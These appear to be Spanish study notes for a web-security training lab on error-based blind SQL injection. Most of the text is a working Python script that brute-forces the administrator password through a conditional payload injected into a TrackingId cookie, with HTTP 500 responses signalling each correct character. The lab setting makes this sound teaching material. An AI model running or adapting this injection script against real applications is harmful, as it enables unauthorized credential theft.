En esta clase continuamos con la explotación de la inyección SQL ciega basada en errores, utilizando las técnicas que vimos anteriormente para completar el proceso de extracción del password del administrador.

Aplicamos lo aprendido para automatizar la obtención de cada carácter de la contraseña utilizando Burp Intruder, apoyándonos en respuestas con error (código 500) para saber si el carácter probado es correcto. Se recorre así toda la cadena de forma sistemática.

Es una continuación directa de la clase anterior, donde verás en práctica cómo automatizar este tipo de ataque para obtener credenciales completas en entornos reales.

Solucion
Se pueden hacer los mismos pasos que la anterior laboratorio pero en este caso vamos a hacer un script para que automatize todo lo anterior
Esto en Burp suite obiamente ya con la intervencion de foxy proxy y ya haciendo los pasos de order by
![[Pasted image 20250703143528.png]]
codigo
![[Pasted image 20250703143230.png]]
![[Pasted image 20250703143151.png]]
lo llamaremos (Solo tenemos que modificar el trackingid, session y la url dando ctrl+shift+c nos vamos a storage o almacenamiento y ahi lo veremos todo)sqli.py
#!/usr/bin/env python3 

from pwn import *
from termcolor import colored 
import requests
import signal 
import sys
import string
import time

def def_handler(sig, frame):
    p1.failure("Ataque de fuerza bruta detenido") 
    print(colored(f"\n[!] saliendo...\n", 'red')) 
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits 
p1 = log.progress("SQLI")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    password = ""
    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                "TrackingId": f"opTM41c5M3tdYiBB'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else'' end from users where username='administrator') ||'",
                "session": "eeBj0F3YK4uowytrMt8WtFXH7U4GcRVo"
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("https://0aed008604509bf28095581100aa00eb.web-security-academy.net", cookies=cookies)

            if r.status_code == 500:
                password += character 
                p2.status(password)
                break

    p1.success("Ataque completado")
    print(colored(f"[+] Contraseña encontrada: {password}", 'green'))

if __name__ == '__main__':
    makeSQLI()

resultado
![[Pasted image 20250703152727.png]]
![[Pasted image 20250703152658.png]]
